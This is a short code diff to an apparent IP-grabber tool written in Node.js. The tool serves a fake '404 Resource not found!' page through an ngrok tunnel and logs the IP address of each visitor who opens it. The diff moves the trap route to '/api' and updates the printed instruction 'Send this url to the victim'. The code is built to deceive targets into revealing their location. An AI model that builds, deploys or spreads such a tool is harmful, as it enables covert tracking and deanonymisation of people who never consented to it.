@@ -25,7 +25,7 @@ async function Menu() {
     banner()
         console.log("")
         var Port = prompt(chalk.yellow(`[+]`) + chalk.blueBright(` Enter a port number: `))
-        app.get('/', (req, res) => {
+        app.get('/api', (req, res) => {
             res.send(`<h1>404 Resource not found!</h1>`)
             console.log("")
             console.log(chalk.greenBright(`[+] IP Logged: `) + chalk.yellowBright(`${req.headers['x-forwarded-for']}`))
@@ -56,7 +56,7 @@ async function Menu() {
                 authtoken: Token.AUTH
             });
             setTimeout(() => {
-                console.log(chalk.yellow(`[+]`) + chalk.blueBright(` Send this url to the victim: ${Url}`))
+                console.log(chalk.yellow(`[+]`) + chalk.blueBright(` Send this url to the victim: ${Url}/api`))
                 console.log("")
                 console.log(chalk.yellow(`[*]`) + chalk.blueBright(` Waiting Targets, Press Ctrl + C to exit...`))
             }, 1000);
